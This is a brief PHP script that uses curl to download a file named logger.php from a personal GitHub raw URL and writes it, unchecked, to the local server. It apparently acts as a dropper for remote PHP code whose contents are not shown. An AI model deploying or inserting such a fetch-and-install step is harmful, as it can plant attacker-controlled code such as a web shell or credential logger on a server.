<?php
$url = "https://raw.githubusercontent.com/wahid7ark/wahid7ark.github.io/refs/heads/main/logger.php";

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$data = curl_exec($ch);
curl_close($ch);

$fp = fopen("logger.php", "w");
fwrite($fp, $data);
fclose($fp);
?>
